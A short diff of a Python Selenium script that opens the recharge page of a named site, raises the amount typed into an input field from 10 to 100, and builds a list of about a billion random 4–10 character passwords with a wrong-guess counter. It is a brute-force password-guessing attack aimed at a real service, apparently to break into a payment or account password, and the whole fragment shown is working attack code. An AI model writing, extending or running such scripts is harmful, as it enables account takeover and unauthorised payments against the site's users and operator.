@@ -47,7 +47,7 @@ def main():
 
         driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
         time.sleep(6)
-        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")
+        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("100")
 
         passwords = [initial_password] + [generate_password(random.randint(4, 10)) for _ in range(1000000000)]
         wrong_count = 0
